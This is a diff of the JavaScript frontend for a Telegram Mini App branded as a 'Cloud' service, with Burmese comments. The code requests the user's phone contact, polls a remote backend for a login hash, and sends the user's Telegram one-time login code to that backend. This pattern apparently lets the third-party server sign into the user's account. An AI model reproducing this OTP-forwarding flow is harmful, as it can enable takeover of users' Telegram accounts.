@@ -1,13 +1,12 @@
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ (အဆုံးတွင် / မပါရပါ)
+// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ
 const BACKEND_URL = "https://telegramcloudbackend.onrender.com"; 
 
-let phoneHash = "";
-let userPhone = "";
+
+let phoneHash = "", userPhone = "", pollingInterval;
 let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";
-let pollingInterval;
 
 function switchStep(stepId) {
     document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
@@ -18,27 +17,24 @@ function switchStep(stepId) {
 function requestContact() {
     tg.requestContact(function(shared) {
         if (shared) {
-            switchStep("step-loading"); // JS Error မတက်တော့ပါ
-            
+            switchStep("step-loading");
             let userId = tg.initDataUnsafe?.user?.id;
+            
             if (!userId) {
-                alert("Error: Telegram User ID ကို ဖတ်၍မရပါ။");
+                alert("Error: Telegram User ID ဖတ်မရပါ။");
                 switchStep("step-phone");
                 return;
             }
             
-            // Backend ဆီသို့ ၂ စက္ကန့်တစ်ခါ လှမ်းစစ်မည်
             pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
             
             setTimeout(() => {
                 if(pollingInterval) {
                     clearInterval(pollingInterval);
-                    alert("Timeout: ဆာဗာနှင့် ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။ ပြန်လည်ကြိုးစားပါ။");
+                    alert("Timeout: ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။");
                     switchStep("step-phone");
                 }
-            }, 15000); // ၁၅ စက္ကန့်အထိ စောင့်မည်
-        } else {
-            alert("Cloud သို့ ဝင်ရောက်ရန် ဖုန်းနံပါတ် မျှဝေရန် လိုအပ်ပါသည်။");
+            }, 15000);
         }
     });
 }
@@ -56,13 +52,10 @@ async function checkContactReceived(userId) {
         if (result.success) {
             clearInterval(pollingInterval); 
             pollingInterval = null;
-            
             userPhone = result.phone;
             phoneHash = result.hash;
-            
             switchStep("step-otp"); 
             tg.HapticFeedback.impactOccurred("medium");
-            
         } else if (result.message) { 
             clearInterval(pollingInterval);
             pollingInterval = null;
@@ -87,7 +80,6 @@ async function verifyOTP() {
         });
         
         let result = await res.json();
-        
         if(result.success) {
             switchStep("step-success");
             tg.HapticFeedback.notificationOccurred("success"); 
@@ -96,8 +88,7 @@ async function verifyOTP() {
             switchStep("step-otp");
         }
     } catch(e) {
-        alert("Verification Failed. ကျေးဇူးပြု၍ ပြန်လည်ကြိုးစားပါ။");
+        alert("Verification Failed.");
         switchStep("step-otp");
     }
-}
 }
